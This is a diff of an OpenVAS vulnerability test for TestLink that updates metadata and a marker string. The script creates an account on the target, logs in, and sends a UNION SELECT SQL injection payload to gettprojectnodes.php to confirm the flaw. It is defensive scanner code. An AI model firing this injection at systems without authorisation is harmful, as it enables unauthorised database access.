@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_testlink_54990.nasl 11049 2018-08-20 08:53:50Z asteins $
+# $Id: gb_testlink_54990.nasl 11435 2018-09-17 13:44:25Z cfischer $
 #
 # TestLink Multiple Security Vulnerabilities
 #
@@ -27,20 +27,20 @@
 
 CPE = "cpe:/a:teamst:testlink";
 
-if (description)
+if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.103536");
   script_bugtraq_id(54990);
   script_tag(name:"cvss_base", value:"7.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:P/A:N");
-  script_version("$Revision: 11049 $");
+  script_version("$Revision: 11435 $");
 
   script_name("TestLink Multiple Security Vulnerabilities");
 
   script_xref(name:"URL", value:"http://www.securityfocus.com/bid/54990");
   script_xref(name:"URL", value:"http://www.teamst.org/");
 
-  script_tag(name:"last_modification", value:"$Date: 2018-08-20 10:53:50 +0200 (Mon, 20 Aug 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-17 15:44:25 +0200 (Mon, 17 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-08-15 10:10:37 +0200 (Wed, 15 Aug 2012)");
   script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
@@ -67,23 +67,25 @@ further attacks.");
   script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
 Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features,
 remove the product or replace the product by another one.");
- exit(0);
+
+  exit(0);
 }
 
 include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
-include("version_func.inc");
+include("misc_func.inc");
 
 if(!port = get_app_port(cpe:CPE))exit(0);
 if(!dir = get_app_location(cpe:CPE, port:port))exit(0);
 
+vtstring = get_vt_string( lowercase:TRUE );
+host = http_host_name(port:port);
+
 login = rand();
 pass = rand();
-fname = 'openvas_' + rand();
-lname = 'openvas_' + rand();
-
-host = get_host_name();
+fname = vtstring + '_' + rand();
+lname = vtstring + '_' + rand();
 
 create_account_post = 'login=' + login  + '&password=' + pass + '&password2=' + pass + '&firstName=' + fname + '&lastName=' + lname + '&email=' + lname + '@example.org&doEditUser=Add+User+Data';
 len = strlen(create_account_post);
@@ -94,9 +96,7 @@ req = string("POST ",dir,"/firstLogin.php HTTP/1.1\r\n",
              "Content-Length: ",len,"\r\n",
              "\r\n",
              create_account_post);
-
 result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
-
 if(result !~ "HTTP/1.. 200" || "location.href=" >!< result)exit(0);
 
 login_post = 'reqURI=&destination=&tl_login=' + login  + '&tl_password=' + pass  + '&login_submit=Login';
@@ -108,9 +108,7 @@ req = string("POST ",dir,"/login.php HTTP/1.1\r\n",
              "Content-Length: ",len,"\r\n",
              "\r\n",
              login_post);
-
 result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
-
 if(result !~ "HTTP/1.. 200" || "location.href=" >!< result)exit(0);
 
 session_id = eregmatch(pattern:"Set-Cookie: ([^;]*);",string:result);
@@ -118,13 +116,12 @@ if(isnull(session_id[1]))exit(0);
 
 id = rand();
 
-req = string("GET ",dir,"/lib/ajax/gettprojectnodes.php?root_node=-1+union+select+0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6-- HTTP/1.1\r\n",
+req = string("GET ",dir,"/lib/ajax/gettprojectnodes.php?root_node=-1+union+select+0x53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6-- HTTP/1.1\r\n",
              "Host: ",host,"\r\n",
              "Cookie: ",session_id[1],"\r\n\r\n");
-
 result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 
-if("OpenVAS-SQL-Injection-Test" >< result) {
+if("SQL-Injection-Test" >< result) {
   security_message(port:port);
   exit(0);
 }
